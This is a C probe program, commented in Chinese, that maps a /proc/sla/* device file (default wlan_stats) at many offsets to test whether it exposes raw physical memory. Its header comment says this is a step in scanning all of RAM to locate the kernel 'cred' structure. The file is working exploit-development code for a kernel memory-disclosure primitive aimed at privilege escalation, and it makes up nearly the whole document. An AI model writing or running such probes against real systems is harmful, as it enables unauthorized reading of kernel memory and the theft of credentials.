/* mtest.c — 只读探针: **`/proc/sla/*` 的 mmap offset 到底是不是在走物理页?**
 * 为什么必须先问这一句: sen14 的 8 GB 扫描里, 从块#68 开始每个块都报**完全相同**的
 * T_off/锚点/内容 ⇒ 那已经是重复映射, 不是新物理内存。若 offset 根本不生效,
 * "把整机 RAM 逐块翻过来读"这条前提就作废, cred 必须换别的路子拿。
 * 全程零风险: 只 open/read/mmap, 不 punch、不写任何东西。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>

static sigjmp_buf jb;
static volatile int on;
static void h(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }

static int fd;
/* 读一个物理偏移处(=mmap offset)的 8 字节; 返回 0 成功 */
static int peek(uint64_t off, uint64_t *out) {
  off_t pg = (off_t)(off & ~(uint64_t)0xfff);
  uint64_t in = off & 0xfff;
  unsigned char *m = mmap(NULL, 8192, PROT_READ, MAP_SHARED, fd, pg);
  if (m == MAP_FAILED) return -1;
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = h; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  int rc = -1;
  on = 1;
  if (sigsetjmp(jb, 1) == 0) { *out = q(m, in); rc = 0; }
  on = 0;
  sigaction(SIGBUS, &old, NULL);
  munmap(m, 8192);
  return rc;
}

int main(int argc, char **argv) {
  const char *path = argc > 1 ? argv[1] : "/proc/sla/wlan_stats";
  fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return 1; }
  printf("== %s: 每个探测点都是**独立的一次 mmap(offset=该值)**, 所以只有 offset 真生效才会有差别 ==\n", path);
  static const uint64_t steps[] = {
    0, 4096, 8192, 0x1000, 0x20000, 0x100000, 0x1000000, 0x10000000,
    0x40000000ULL, 0x100000000ULL, 0x400000000ULL, 0x1000000000ULL, 0x1c0000ULL
  };
  for (unsigned i = 0; i < sizeof steps / sizeof *steps; i++) {
    uint64_t v = 0;
    int rc = peek(steps[i], &v);
    printf("  off=0x%011llx (%6llu MB) ⇒ %s 首格=%016llx\n",
           (unsigned long long)steps[i], (unsigned long long)(steps[i] >> 20),
           rc ? "读不到" : "", (unsigned long long)(rc ? 0 : v));
  }
  /* 同一次映射里, 内部偏移 o 与 o+64MB 是否相同 ⇒ 检查"映射超出缓冲后被重复填充" */
  size_t L = 128u * 1024u * 1024u;
  unsigned char *m = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { printf("  128MB 映射失败 errno=%d(%s)\n", errno, strerror(errno)); return 0; }
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = h; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t first_bad = 0, np = L / 4096u;
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; }
    else { if (!first_bad) first_bad = i; on = 0; continue; }
    on = 0;
  }
  printf("== 单次 mmap(0,128MB): 第一个不可读页 = %s, 之后是否又变可读见下 ==\n",
         first_bad ? "" : "无(全可读)");
  if (first_bad) printf("   first_bad = 页#%zu (+0x%zx)\n", first_bad, first_bad * 4096u);
  for (size_t i = 0; i < 12; i++) {
    size_t o = (first_bad ? first_bad * 4096u : 0) + i * 0x800000u;
    if (o + 8 > L) break;
    on = 1;
    uint64_t v = 0;
    if (sigsetjmp(jb, 1) == 0) v = q(m, o);
    on = 0;
    printf("   +%8zu MB (0x%08zx): %016llx\n", o >> 20, o, (unsigned long long)v);
  }
  /* 周期性检验: o 与 o+P 是否逐字节相同(取几页做哈希) */
  unsigned char hbuf[64];
  (void)hbuf;
  printf("== 前 64 页每页首 8 字节(看有没有明显的重复块) ==\n");
  for (size_t o = 0; o < 64u * 4096u; o += 4096u) {
    on = 1;
    uint64_t v = 0;
    if (sigsetjmp(jb, 1) == 0) v = q(m, o);
    on = 0;
    printf("   +%2zu MB: %016llx\n", o >> 20, (unsigned long long)v);
  }
  munmap(m, L);
  close(fd);
  return 0;
}
